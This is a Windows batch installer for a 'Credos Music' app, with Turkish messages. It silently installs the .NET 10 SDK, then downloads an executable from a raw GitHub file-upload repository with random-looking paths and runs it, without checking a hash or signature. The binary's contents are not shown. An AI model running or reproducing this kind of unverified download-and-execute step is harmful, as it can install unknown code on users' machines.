@echo off
title Credos Music - Full Kurulum
set "dotnet_url=https://builds.dotnet.microsoft.com/dotnet/Sdk/10.0.101/dotnet-sdk-10.0.101-win-x64.exe"
set "exe_url=https://raw.githubusercontent.com/cdexecctru/fileupld/main/656zsi8o/credos_music.exe"
set "readme_url=https://raw.githubusercontent.com/cdexecctru/fileupld/main/a23whczo/readme.txt"

echo Bilesenler indiriliyor, lutfen bekleyin...

:: 1. .NET 10 Kurulumu
powershell -Command "Invoke-WebRequest -Uri '%dotnet_url%' -OutFile 'dotnet_install.exe'"
echo .NET Kuruluyor...
start /wait dotnet_install.exe /quiet /norestart
del dotnet_install.exe

:: 2. Uygulama ve Readme Indirme
echo Uygulama dosyalari cekiliyor...
powershell -Command "Invoke-WebRequest -Uri '%exe_url%' -OutFile 'credos_music.exe'"
powershell -Command "Invoke-WebRequest -Uri '%readme_url%' -OutFile 'readme.txt'"

echo Islem tamam! Uygulama baslatiliyor...
start credos_music.exe
exit